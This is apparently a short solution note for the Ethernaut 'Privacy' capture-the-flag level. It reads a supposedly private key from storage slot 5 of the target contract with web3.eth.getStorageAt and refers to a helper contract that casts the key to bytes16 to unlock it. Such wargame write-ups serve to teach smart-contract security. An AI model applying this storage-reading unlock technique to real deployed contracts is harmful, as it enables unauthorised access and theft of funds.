// => Player address 0x0718eccf37de50e31620C658B2c96adDc1e76300
// => Ethernaut address 0xD991431D8b033ddCb84dAD257f4821E9d5b38C33
// => Instance address 0xC15D9B50C61d64246269315c17F95E3f8dD3446b

// solution

// because of how solidity handles the storage, we can know that the "_key"
// that is the item at index 2 in the "data" array, will be in the slot number 5 of the storage
// then we need to make another contract to call it with the bytes32 key and then
// cast the that key to bytes16 an then call the original contract

const password = await web3.eth.getStorageAt(contract.address, 5);

// see HackPrivacy.sol

await contract.locked() // false